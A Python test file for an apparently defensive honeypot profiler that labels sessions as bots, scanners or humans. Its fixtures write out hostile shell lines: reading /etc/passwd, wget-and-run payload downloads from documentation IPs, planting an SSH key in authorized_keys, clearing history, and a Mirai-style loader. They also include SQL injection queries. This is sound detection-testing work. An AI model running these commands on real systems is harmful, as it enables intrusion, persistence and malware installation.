"""Bot/human classification on synthetic corpora shaped like real traffic."""

from __future__ import annotations

import json
import random

from mirage_trap.core.profiler import Profiler, profile_session

T0 = 1_700_000_000.0


def req(ts, path, status=200, attack=None, method="GET", query="", response_len=500):
    return {"ts": ts, "kind": "request", "method": method, "path": path, "query": query, "status": status,
            "attack_type": attack, "response_len": response_len, "headers": None}


def cmd(ts, line, status=0):
    return {"ts": ts, "kind": "command", "method": "shell", "path": line, "status": status, "attack_type": None,
            "query": None, "headers": None, "response_len": 10}


def test_sqlmap_is_an_automated_exploit_tool():
    rng = random.Random(1)
    events = [req(T0 + i * 0.08 + rng.random() * 0.01, "/product.php", 200, "sqli",
                  query=f"id=1 AND {i}={i}") for i in range(80)]
    v = profile_session({"user_agent": "sqlmap/1.7.2#stable (https://sqlmap.org)", "protocol": "http"}, events)
    assert v.kind == "bot"
    assert v.tool == "sqlmap 1.7.2"
    assert v.sophistication == 2


def test_wordlist_scanner():
    rng = random.Random(2)
    paths = ["/admin", "/backup.zip", "/.git/HEAD", "/wp-login.php", "/test", "/old", "/db.sql", "/.env"]
    events = [req(T0 + i * 0.05, rng.choice(paths) + str(i), 404 if i % 9 else 200) for i in range(120)]
    v = profile_session({"user_agent": "Mozilla/5.0 (compatible; Nuclei - Open-source project)", "protocol": "http"}, events)
    assert v.kind == "scanner" and v.tool == "nuclei"
    assert v.sophistication <= 2


def test_mass_scan_drive_by():
    events = [req(T0, "/.env", 200, "recon")]
    v = profile_session({"user_agent": "Go-http-client/1.1", "protocol": "http"}, events)
    assert v.kind in ("scanner", "bot")
    assert v.sophistication == 1


def test_manual_ssh_operator_is_human_and_sophisticated():
    lines = ["id", "uname -a", "cat /etc/passwd", "ls -la /var/www/html", "cat /var/www/html/config.php",
             "mysql -h db-prod-01 -u app -p", "sudo -l", "lls", "ls /home", "wget http://203.0.113.5/a.sh -O /tmp/.a",
             "echo 'ssh-ed25519 AAAA... op' >> ~/.ssh/authorized_keys", "history -c"]
    t, events = T0, [{"ts": T0, "kind": "connect", "headers": json.dumps([["client_version", "SSH-2.0-OpenSSH_9.6"]])}]
    rng = random.Random(3)
    for line in lines:
        t += rng.uniform(3, 45)
        events.append(cmd(t, line, 127 if line == "lls" else 0))
    v = profile_session({"protocol": "ssh", "user_agent": None}, events, cred_attempts=1, cred_success=1)
    assert v.kind == "human", v.reasons
    assert v.tool == "OpenSSH client"
    assert v.sophistication == 5          # persistence + anti-forensics


def test_mirai_style_bot():
    events = [{"ts": T0, "kind": "connect", "headers": json.dumps([["client_version", "SSH-2.0-libssh2_1.9.0"]])}]
    for i, line in enumerate(["enable; system; shell; sh", "cat /proc/cpuinfo | grep name | wc -l",
                              "cd /tmp || cd /var/run; wget http://203.0.113.8/bins.sh; sh bins.sh",
                              "/bin/busybox MIRAI"]):
        events.append(cmd(T0 + 0.2 + i * 0.15, line))
    v = profile_session({"protocol": "ssh"}, events, cred_attempts=12, cred_success=1)
    assert v.kind == "bot"
    assert v.tool == "libssh2"


def test_web_then_ssh_chaining_scores_4():
    events = [req(T0, "/.env", 200, "recon"), req(T0 + 20, "/phpmyadmin/", 200, "recon"),
              req(T0 + 55, "/phpmyadmin/index.php", 302, None, "POST")]
    events += [cmd(T0 + 120 + i * 15, c) for i, c in enumerate(["id", "hostname", "ls /var/www", "cat /etc/hosts"])]
    v = profile_session({"protocol": "http,ssh", "user_agent": "curl/8.4.0"}, events, canary_hits=2,
                        cred_attempts=2, cred_success=2)
    assert v.sophistication == 4
    assert v.kind in ("human", "hybrid")


def test_empty_session_is_unknown():
    v = profile_session({}, [])
    assert v.kind == "unknown" and v.sophistication == 0


def test_profiler_updates_database(make_trap):
    c = make_trap()
    s, _ = c.deceiver.sessions.resolve("198.51.100.66", "http", user_agent="sqlmap/1.8#stable")
    for i in range(30):
        c.telemetry.event(s, protocol="http", kind="request", method="GET", path="/product.php",
                          query=f"id={i}", status=200, attack_type="sqli", ts=T0 + i * 0.05)
    c.telemetry.flush()
    assert Profiler(c.db).run_once(now=T0 + 10) >= 1
    row = c.db.one("SELECT kind, tool, sophistication FROM sessions WHERE id=?", (s.id,))
    assert row == {"kind": "bot", "tool": "sqlmap 1.8", "sophistication": 2}
